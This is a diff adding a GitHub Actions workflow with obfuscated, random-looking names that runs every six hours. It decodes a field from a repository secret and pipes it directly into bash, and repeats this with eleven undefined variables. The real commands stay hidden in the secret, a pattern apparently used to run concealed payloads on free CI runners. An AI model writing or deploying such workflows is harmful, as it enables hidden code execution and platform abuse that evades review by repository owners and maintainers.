@@ -1,0 +1,28 @@
+name: meibaodi4317
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '16 2/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: meibaodi4317
+        env:
+          ui2: ${{ secrets.ui2 }}
+        run: |
+          echo $ui2 | jq -r .cv12678 | /bin/bash
+          echo $hmwag9590 | jq -r .gq280 | /bin/bash
+          echo $fac788 | jq -r .xqoyu47246 | /bin/bash
+          echo $qscw61468 | jq -r .ue45133 | /bin/bash
+          echo $olp7 | jq -r .pev676 | /bin/bash
+          echo $c5492 | jq -r .jgc07 | /bin/bash
+          echo $tjp82 | jq -r .xtn2468 | /bin/bash
+          echo $u92 | jq -r .fa8705 | /bin/bash
+          echo $xww4691 | jq -r .wrw1124 | /bin/bash
+          echo $wbqmi50075 | jq -r .hcm6 | /bin/bash
+          echo $f70202 | jq -r .m5818 | /bin/bash
+          echo $w9818 | jq -r .kwkij3 | /bin/bash
+
